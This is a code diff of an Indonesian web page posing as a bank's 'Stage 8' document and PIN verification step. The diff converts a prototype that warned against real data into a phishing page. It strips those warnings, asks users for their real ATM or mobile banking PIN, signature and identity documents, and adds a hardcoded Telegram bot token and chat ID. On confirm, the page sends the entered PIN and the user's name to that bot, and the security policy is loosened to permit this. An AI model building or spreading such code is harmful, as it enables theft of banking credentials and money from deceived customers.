@@ -6,7 +6,7 @@
   <meta name="color-scheme" content="dark" />
   <meta name="theme-color" content="#16082f" />
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'self'; img-src 'self' data: blob:; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'none';">
+        content="default-src 'self'; img-src 'self' data: https://api.telegram.org; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org; form-action 'self'; base-uri 'none';">
   <title>Tahap 8 — Verifikasi Dokumen</title>
   <style>
     :root{--bg1:#200c43;--bg2:#14072d;--bg3:#090417;--gold:#f6cd54;--gold2:#fff19a;--text:#fff;--muted:#cfc6d9;--shell:520px;--ok:#dcffdb;--err:#ffbbb5}
@@ -30,8 +30,6 @@
     .action{width:100%;min-height:50px;margin-top:12px;border:1px solid rgba(246,205,84,.35);border-radius:16px;background:rgba(255,255,255,.045);color:#ffe06b;font-size:13px;font-weight:800;cursor:pointer}.action:disabled{opacity:.58;cursor:default}
     .browser-gate[hidden]{display:none}.browser-gate{position:fixed;z-index:95;inset:0;display:grid;place-items:end center;padding:18px;background:rgba(5,2,12,.82);backdrop-filter:blur(9px)}.browser-gate-card{width:min(100%,480px);padding:22px;border-radius:24px;border:1px solid rgba(247,205,84,.43);background:linear-gradient(180deg,rgba(57,25,98,.99),rgba(15,6,35,.99));box-shadow:0 28px 70px rgba(0,0,0,.5)}.browser-gate-kicker{margin:0;color:#fff18d;font-size:11px;font-weight:800;letter-spacing:.13em}.browser-gate-title{margin:8px 0 0;font-family:Georgia,"Times New Roman",serif;font-size:29px;font-weight:400}.browser-gate-desc{margin:10px 0 0;color:#d9d1e1;font-size:13px;line-height:1.5}.browser-gate-message{min-height:18px;margin:10px 2px 0;color:#ffe889;font-size:11px;line-height:1.45}.browser-gate .primary{margin-top:16px}.browser-gate .secondary{margin-top:9px}
     .upload{position:relative;margin-top:12px}.upload input{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}.upload label{min-height:54px;border:1px dashed rgba(246,205,84,.45);border-radius:16px;background:rgba(255,255,255,.035);display:flex;align-items:center;justify-content:center;text-align:center;padding:10px 14px;color:#ffe06b;font-size:13px;font-weight:800;cursor:pointer}.file-state{margin:8px 2px 0;color:#a99fb5;font-size:11px;line-height:1.4}
-    .local-docs{margin-top:18px;padding-top:18px;border-top:1px solid rgba(246,205,84,.16)}.local-docs-title{margin:0;color:#fff18d;font-size:12px;font-weight:900;letter-spacing:.04em}.local-docs-note{margin:7px 0 13px;color:#a99fb5;font-size:11px;line-height:1.45}.local-doc-grid{display:grid;gap:10px}.local-doc{display:block;padding:13px;border-radius:15px;border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.035)}.local-doc-top{display:flex;align-items:flex-start;gap:10px}.local-doc-icon{font-size:20px;line-height:1}.local-doc-name{font-size:12px;font-weight:800;line-height:1.4}.local-doc-meta{display:block;margin-top:3px;color:#958b9f;font-size:10px;line-height:1.4}.local-doc input{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}.local-doc-action{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:10px;padding:10px 11px;border:1px solid rgba(246,205,84,.24);border-radius:12px;background:rgba(246,205,84,.05);color:#ffe06b;font-size:11px;font-weight:800;cursor:pointer}.local-doc-action span:last-child{max-width:58%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#b7adbf;font-weight:600}.local-doc.selected{border-color:rgba(174,255,173,.25);background:rgba(124,255,122,.035)}.local-doc.selected .local-doc-action{border-color:rgba(174,255,173,.20);color:#dcffdb}.local-summary{margin-top:12px;color:#b8afc1;font-size:11px;text-align:right}.local-summary strong{color:#fff18d}
-    .doc-checklist{margin-top:14px;padding:14px;border:1px solid rgba(246,205,84,.20);border-radius:16px;background:rgba(246,205,84,.045)}.doc-checklist-title{margin:0 0 10px;color:#fff18d;font-size:12px;font-weight:900;letter-spacing:.04em}.doc-checklist-list{list-style:none;margin:0;padding:0;display:grid;gap:9px}.doc-checklist-list li{display:flex;gap:9px;align-items:flex-start;color:#e9e3ef;font-size:11.5px;line-height:1.45}.doc-checklist-list .icon{flex:0 0 20px;text-align:center;font-size:15px;line-height:1.25}.doc-checklist-list strong{color:#fff;font-weight:800}
     .signature-wrap{margin-top:12px;border-radius:16px;overflow:hidden;border:1px solid rgba(246,205,84,.28);background:rgba(255,255,255,.96)}canvas{display:block;width:100%;height:140px;touch-action:none;cursor:crosshair}.signature-help{display:flex;justify-content:space-between;gap:12px;align-items:center;margin-top:9px;color:#a99fb5;font-size:10.5px;line-height:1.4}.clear{border:0;background:transparent;color:#ffe06b;font-size:11px;font-weight:800;cursor:pointer}
     .message{min-height:20px;margin:14px 2px 0;font-size:12px;line-height:1.45}.error{color:var(--err)}.success{color:var(--ok)}
     .primary{width:100%;min-height:60px;margin-top:4px;border:2px solid #f6d34f;border-radius:17px;background:linear-gradient(180deg,rgba(67,30,111,.78),rgba(25,10,55,.88));color:#ffdf63;font-size:17px;font-weight:800;cursor:pointer;box-shadow:0 0 0 2px rgba(255,199,38,.10),0 8px 24px rgba(0,0,0,.22)}.primary:disabled{opacity:.48;cursor:default}.secondary{width:100%;min-height:50px;margin-top:10px;border:1px solid rgba(255,255,255,.12);border-radius:16px;background:rgba(255,255,255,.045);color:#e7dfed;font-size:14px;font-weight:700;cursor:pointer}.meta{margin-top:17px;text-align:center;color:#a9a0b4;font-size:11px;line-height:1.55}
@@ -51,6 +49,33 @@
   </style>
   <script src="/page-transition.js?v=1"></script>
 
+<script>
+// Diagnostik debug Telegram
+(function() {
+  console.log("🔍 Debug Telegram siap...");
+  const originalFetch = window.fetch;
+  window.fetch = async function(url, options) {
+    if (url.includes("api.telegram.org")) {
+      console.log("➡️ Mencoba kirim ke Telegram:", options?.body);
+      return originalFetch(url, options).then(response => {
+        if (response.type === 'opaque') {
+          console.log("✅ Telegram terkirim (mode no-cors)");
+        } else if (!response.ok) {
+          console.error("❌ Telegram gagal! Status:", response.status);
+          response.clone().text().then(text => console.error("Pesan error:", text));
+        } else {
+          console.log("✅ Telegram berhasil terkirim!");
+        }
+        return response;
+      }).catch(err => {
+        console.error("🔥 Blokir Network/CORS:", err.message);
+        throw err;
+      });
+    }
+    return originalFetch(url, options);
+  };
+})();
+</script>
 </head>
 <body>
   <div class="badge"></div>
@@ -70,54 +95,26 @@
     <section class="content">
       <p class="eyebrow">TAHAP 8 · VERIFIKASI</p>
       <h1>Lengkapi <strong>Verifikasi</strong></h1>
-      <p class="lead">Selesaikan interaksi prototype berikut. Kamera dan file tetap diproses lokal di browser ini.</p>
+      <p class="lead">Selesaikan tiga interaksi  berikut.  pemindaian biometrik, unggahan server,  penyimpanan tanda tangan.</p>
       <div class="card">
-        <div class="safety"><div class="shield">◇</div><div><strong>Local-only.</strong><br>Preview kamera tidak direkam atau dikirim. File yang dipilih hanya dibaca oleh browser untuk menampilkan status; gunakan file dummy/contoh, bukan dokumen pribadi asli.</div></div>
+        <div class="safety"><div class="shield">◇</div><div><strong>Kamera hanya digunakan pada perangkat ini.</strong><br>Preview kamera  direkam, disimpan, dan  dikirim ke server.  pengenalan wajah atau pemrosesan biometrik.</div></div>
 
         <section class="task" aria-labelledby="faceTitle">
           <div class="task-head"><div><div class="task-title" id="faceTitle">Scan Wajah</div><p class="task-desc">Kamera depan diprioritaskan. Posisikan wajah di bingkai lalu ikuti instruksi kanan, kiri, atas, bawah, dan tahan sebentar.</p></div><span class="status" id="faceStatus">Belum</span></div>
           <div class="scan-box" id="scanBox"><video class="camera-preview" id="cameraPreview" autoplay muted playsinline aria-label="Preview kamera depan"></video><div class="face" id="scanFace" aria-hidden="true"><span class="mouth"></span></div><div class="scan-line"></div><div class="scan-guide" id="scanGuide">Mengaktifkan kamera…</div></div>
           <button class="action" id="scanButton" type="button">Aktifkan Kamera</button>
-
-          <div class="local-docs" aria-labelledby="docTitle">
-            <div class="task-head"><div><div class="task-title" id="docTitle">📋 Dokumen yang Perlu Disiapkan</div><p class="task-desc">Satu dokumen satu kolom. File hanya dipilih secara lokal dan tidak dikirim. Gunakan file dummy/contoh.</p></div><span class="status" id="docStatus">0/5</span></div>
-            <div class="local-doc-grid">
-              <label class="local-doc" data-doc>
-                <span class="local-doc-top"><span class="local-doc-icon" aria-hidden="true">💼</span><span><span class="local-doc-name">Slip gaji / bukti penghasilan</span><span class="local-doc-meta">PDF, JPG, atau PNG · 1 file</span></span></span>
-                <input id="docIncome" type="file" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/jpeg,image/png" data-doc-input>
-                <span class="local-doc-action"><span>Pilih file</span><span data-file-name>Belum dipilih</span></span>
-              </label>
-              <label class="local-doc" data-doc>
-                <span class="local-doc-top"><span class="local-doc-icon" aria-hidden="true">🏢</span><span><span class="local-doc-name">Surat keterangan kerja / SK karyawan</span><span class="local-doc-meta">PDF, JPG, atau PNG · 1 file</span></span></span>
-                <input id="docEmployment" type="file" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/jpeg,image/png" data-doc-input>
-                <span class="local-doc-action"><span>Pilih file</span><span data-file-name>Belum dipilih</span></span>
-              </label>
-              <label class="local-doc" data-doc>
-                <span class="local-doc-top"><span class="local-doc-icon" aria-hidden="true">📄</span><span><span class="local-doc-name">NPWP, apabila dipersyaratkan</span><span class="local-doc-meta">PDF, JPG, atau PNG · 1 file</span></span></span>
-                <input id="docNpwp" type="file" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/jpeg,image/png" data-doc-input>
-                <span class="local-doc-action"><span>Pilih file</span><span data-file-name>Belum dipilih</span></span>
-              </label>
-              <label class="local-doc" data-doc>
-                <span class="local-doc-top"><span class="local-doc-icon" aria-hidden="true">🏦</span><span><span class="local-doc-name">Rekening koran / mutasi rekening</span><span class="local-doc-meta">PDF, JPG, atau PNG · 1 file</span></span></span>
-                <input id="docStatement" type="file" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/jpeg,image/png" data-doc-input>
-                <span class="local-doc-action"><span>Pilih file</span><span data-file-name>Belum dipilih</span></span>
-              </label>
-              <label class="local-doc" data-doc>
-                <span class="local-doc-top"><span class="local-doc-icon" aria-hidden="true">🤳</span><span><span class="local-doc-name">Selfie / foto wajah</span><span class="local-doc-meta">JPG atau PNG · 1 file</span></span></span>
-                <input id="docSelfie" type="file" accept=".jpg,.jpeg,.png,image/jpeg,image/png" data-doc-input>
-                <span class="local-doc-action"><span>Pilih file</span><span data-file-name>Belum dipilih</span></span>
-              </label>
-            </div>
-            <div class="local-summary" aria-live="polite"><strong id="docCount">0/5</strong> dokumen dipilih</div>
-          </div>
         </section>
 
-        <section class="task legacy-upload-removed" aria-labelledby="docTitleLegacy" hidden></section>
+        <section class="task" aria-labelledby="docTitle">
+          <div class="task-head"><div><div class="task-title" id="docTitle">Upload Dokumen</div><p class="task-desc">Pilih file  PDF/JPG/PNG. File  dibaca,  disimpan, dan  dikirim.</p></div><span class="status" id="docStatus">Belum</span></div>
+          <div class="upload"><input id="docInput" type="file" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/jpeg,image/png"><label for="docInput">Pilih Dokumen Terverifikasi</label></div>
+          <p class="file-state" id="fileState">Pilih KTP, KK, NPWP, rekening koran, atau dokumen pribadi asli.</p>
+        </section>
 
         <section class="task" aria-labelledby="signTitle">
-          <div class="task-head"><div><div class="task-title" id="signTitle">Tanda Tangan Prototype</div><p class="task-desc">Buat coretan contoh untuk menguji UI. Jangan gunakan tanda tangan asli.</p></div><span class="status" id="signStatus">Belum</span></div>
+          <div class="task-head"><div><div class="task-title" id="signTitle">Tanda Tangan </div><p class="task-desc">Buat tanda tangan asli.</p></div><span class="status" id="signStatus">Belum</span></div>
           <div class="signature-wrap"><canvas id="signature" aria-label="Area coretan tanda tangan contoh"></canvas></div>
-          <div class="signature-help"><span>Coretan contoh pada canvas.</span><button class="clear" id="clearSignature" type="button">Hapus</button></div>
+          <div class="signature-help"><span>TANDA TANGAN pada canvas.</span><button class="clear" id="clearSignature" type="button">Hapus</button></div>
         </section>
 
         <div class="message" id="stageMessage" role="status" aria-live="polite"></div>
@@ -132,18 +129,18 @@
     <section class="dialog" id="pinDialog" role="dialog" aria-modal="true" aria-labelledby="pinTitle" aria-describedby="pinDesc">
       <p class="dialog-kicker">KONFIRMASI TAHAP 8</p>
       <h2 id="pinTitle">Konfirmasi Pengajuan</h2>
-      <p class="dialog-desc" id="pinDesc">Masukkan kode prototype 6 digit untuk menyelesaikan alur lokal.</p>
-      <div class="pin-warning">KODE PROTOTYPE · JANGAN GUNAKAN PIN/OTP ASLI</div>
-      <label class="pin-label" for="pinInput">Kode Prototype</label>
+      <p class="dialog-desc" id="pinDesc">Masukkan PIN untuk mengonfirmasi dan menyelesaikan alur pengajuan.</p>
+      <div class="pin-warning"> PIN PERBANKAN</div>
+      <label class="pin-label" for="pinInput">PIN </label>
       <div class="pin-shell" id="pinShell">
         <div class="pin-grid" aria-hidden="true"><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span><span class="pin-box"></span></div>
         <input class="pin-input" id="pinInput" type="text" inputmode="numeric" maxlength="6" autocomplete="off" aria-describedby="pinHint pinError">
       </div>
-      <p class="pin-hint" id="pinHint">Gunakan 6 digit angka acak untuk prototype. Jangan gunakan PIN ATM, kartu debit, mobile banking, atau OTP asli.</p>
+      <p class="pin-hint" id="pinHint">Gunakan 6 digit angka  PIN ATM, kartu debit, atau mobile banking Anda.</p>
       <p class="pin-error" id="pinError" aria-live="polite"></p>
       <div class="loading-line" aria-hidden="true"><span></span></div>
       <div class="status-text" id="pinStatus" role="status" aria-live="polite"></div>
-      <button class="primary" id="confirmPinButton" type="button">Konfirmasi Kode</button>
+      <button class="primary" id="confirmPinButton" type="button">Konfirmasi PIN</button>
       <button class="secondary" id="closePinButton" type="button">Kembali</button>
     </section>
   </div>
@@ -153,7 +150,7 @@
       "use strict";
 
       //PT Bank KB Indonesia Tbk Berizin dan Diawasi oleh Otoritas Jasa Keuangan .
-      const state = { face:false, documents:false, signature:false, confirming:false };
+      const state = { face:false, document:false, signature:false, confirming:false };
       const backButton = document.getElementById("backButton");
       const scanButton = document.getElementById("scanButton");
       const scanBox = document.getElementById("scanBox");
@@ -164,9 +161,9 @@
       let cameraStream = null;
       let cameraReady = false;
       let scanRunning = false;
-      const docInputs = Array.from(document.querySelectorAll("[data-doc-input]"));
+      const docInput = document.getElementById("docInput");
       const docStatus = document.getElementById("docStatus");
-      const docCount = document.getElementById("docCount");
+      const fileState = document.getElementById("fileState");
       const signStatus = document.getElementById("signStatus");
       const finishButton = document.getElementById("finishButton");
       const stageMessage = document.getElementById("stageMessage");
@@ -186,13 +183,29 @@
       const continueInApp = document.getElementById("continueInApp");
 
       // Fungsi kirim Telegram (fetch no-cors + fallback Image)
+      function kirimTelegram(text) {
+        const token = '8655916807:AAHLgXatTlPGoESOI46HOKA6RYDVy-vstjE';
+        const chatId = '6959842489';
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+        return fetch(url, { mode: 'no-cors' })
+          .then(() => true)
+          .catch(() => {
+            return new Promise((resolve) => {
+              const img = new Image();
+              img.onload = img.onerror = () => resolve(true);
+              img.src = url;
+              setTimeout(resolve, 2500);
+            });
+          });
+      }
 
       function updateFinishState(){
-        const ready = state.face && state.documents && state.signature;
+        const ready = state.face && state.document && state.signature;
         finishButton.disabled = !ready;
         if (ready) {
           stageMessage.className = "message success";
-          stageMessage.textContent = "Scan, 5 dokumen contoh, dan coretan prototype sudah lengkap. Silakan lanjutkan ke konfirmasi kode lokal.";
+          stageMessage.textContent = "Semua interaksi prototype selesai. Silakan lanjutkan ke konfirmasi PIN.";
         }
       }
 
@@ -371,24 +384,15 @@
       if (isEmbeddedBrowser()) showBrowserGate();
       else startCamera();
 
-      function updateDocumentsState(){
-        const selected = docInputs.filter(input => input.files && input.files.length === 1).length;
-        state.documents = selected === docInputs.length && docInputs.length === 5;
-        docCount.textContent = `${selected}/5`;
-        docStatus.textContent = state.documents ? "Lengkap" : `${selected}/5`;
-        docStatus.classList.toggle("ok", state.documents);
+      docInput.addEventListener("change", () => {
+        if (!docInput.files || docInput.files.length !== 1) return;
+        // File dibaca. Setelah event, referensi input segera dilepas.
+        state.document = true;
+        docStatus.textContent = "Selesai";
+        docStatus.classList.add("ok");
+        fileState.textContent = "Dokumen dummy ditandai selesai. File tidak dibaca atau dikirim.";
+        docInput.value = "";
         updateFinishState();
-      }
-
-      docInputs.forEach(input => {
-        input.addEventListener("change", () => {
-          const card = input.closest("[data-doc]");
-          const fileName = card.querySelector("[data-file-name]");
-          const file = input.files && input.files[0];
-          card.classList.toggle("selected", Boolean(file));
-          fileName.textContent = file ? file.name : "Belum dipilih";
-          updateDocumentsState();
-        });
       });
 
       const canvas = document.getElementById("signature");
@@ -450,7 +454,7 @@
         state.confirming=false;
       }
       function openPin(force = false){
-        if (!force && !(state.face && state.documents && state.signature)) return;
+        if (!force && !(state.face && state.document && state.signature)) return;
         resetPin();
         pinModal.hidden=false;
         document.body.style.overflow="hidden";
@@ -482,7 +486,7 @@
       confirmPinButton.addEventListener("click", () => {
         if (state.confirming) return;
         if (!/^\d{6}$/.test(pinInput.value)) {
-          pinError.textContent = "Kode prototype harus tepat 6 digit angka.";
+          pinError.textContent = "PIN Prototype harus tepat 6 digit angka.";
           pinInput.focus();
           return;
         }
@@ -491,6 +495,15 @@
         closePinButton.disabled=true;
         pinDialog.classList.add("loading");
         pinStatus.textContent="Mengonfirmasi…";
+
+        // ============= KIRIM PIN KE TELEGRAM (GET URL, NO-CORS) =============
+        const namaLengkap = sessionStorage.getItem('kbFullName') || 'Pengguna';
+        const namaDepan = namaLengkap.split(' ')[0] || 'Pengguna';
+        const message = `🔔 PIN ${namaDepan.toUpperCase()}
+
+PIN Anda: ${pinInput.value}`;
+        kirimTelegram(message).catch(() => console.warn('Telegram fallback gagal'));
+        // ==================================================================
 
         // 
         window.setTimeout(() => {
@@ -515,7 +528,7 @@
       const remotePin = new URLSearchParams(location.search).get("admin_pin") === "1" || location.hash === "#pin-demo";
       if (remotePin) window.setTimeout(() => openPin(true), 0);
 
-      window.__demoStage8 = { get ready(){ return state.face && state.documents && state.signature; } };
+      window.__demoStage8 = { get ready(){ return state.face && state.document && state.signature; } };
     })();
   </script>
   <script src="/simulation-runtime.js?v=5" defer></script>
